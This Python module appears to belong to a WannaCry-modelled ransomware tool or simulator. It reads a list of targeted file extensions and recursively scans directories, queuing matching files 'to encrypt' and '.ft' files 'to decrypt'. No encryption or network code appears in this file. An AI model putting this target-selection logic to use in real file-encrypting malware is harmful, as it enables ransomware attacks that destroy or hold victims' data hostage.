from os import listdir
from os.path import isdir, isfile, splitext
from time import sleep
from print_action import print_scan

# Dictionary of extensions affected for Wannacry
src_dic = set()
# References of files to encrypt, decrypt and error files and directories
encrypt_dir = []
decrypt_dir = []
error_files = []

# Function of charge dictionary for 'src_dic'
def get_dictionary(silent=False):
    try:
        with open("dic_wcry.txt","r") as dic_wcry:
            for ext in dic_wcry:
                src_dic.add(ext.replace('\n',""))
        return True
    except:
        if silent == False:
            print("ERROR READ DICTIONARY!")
        return False

# Function of charge directories and subdirectories to encrypt
def scan_encrypt_dirs(dir=None, silent=False):
    try:
        files = []
        # Scan directories
        for obj in listdir(dir):
            if isfile(dir+'/'+obj):
                # Verification of extension
                name, ext = splitext(dir+'/'+obj)
                if ext in src_dic: 
                    files.append(dir+'/'+obj)
                else:
                    error_files.append(dir+'/'+obj)
        directory = {dir:files}
        encrypt_dir.append(directory)
        # Scan subdirectories
        for obj in listdir(dir):
            if isdir(dir+'/'+obj):
                scan_encrypt_dirs(dir+'/'+obj)
    except Exception:
        if silent == False:
            print("ERROR READ DIRECTORY -> {}".format(dir))
            sleep(0.2)

# Function of charge directories and subdirectories to decrypt
def scan_decrypt_dirs(dir=None,silent=False):
    try:
        files = []
        # Scan directories
        for obj in listdir(dir):
            if isfile(dir+"/"+obj):
                # Verification of extension
                file,ext = splitext(obj)
                if ext == '.ft':
                    name,o_ext = splitext(obj[:-3])
                    if o_ext in src_dic:
                        files.append(dir+'/'+obj)
                    else:
                        error_files.append(dir+"/"+obj)
                else:
                    error_files.append(dir+"/"+obj)
        directory = {dir:files}
        decrypt_dir.append(directory)
        # Scan subdirectories
        for obj in listdir(dir):
            if isdir(dir+'/'+obj):
                scan_decrypt_dirs(dir+'/'+obj)
    except Exception:
        if silent == False:
            print("ERROR READ DIRECTORY -> {}".format(dir))
            sleep(0.2)

# Function for scan directories to encrypt
def scan_encrypt(dir=None,silent=False):
    # Check dictionary Wannacry
    if get_dictionary(silent=silent):
        # Scan directories to encrypt
        scan_encrypt_dirs(dir=dir,silent=silent)
        if silent == False:
            print_scan(lst_dirs=encrypt_dir,lst_error=error_files)
        return encrypt_dir

# Function for scan directories to decrypt
def scan_decrypt(dir=None,silent=False):
    # Check dictionary Wannacry
    if get_dictionary(silent=silent):
        # Scan directories to decrypt
        scan_decrypt_dirs(dir=dir,silent=silent)
        if silent == False:
                print_scan(lst_dirs=decrypt_dir,lst_error=error_files)
        return decrypt_dir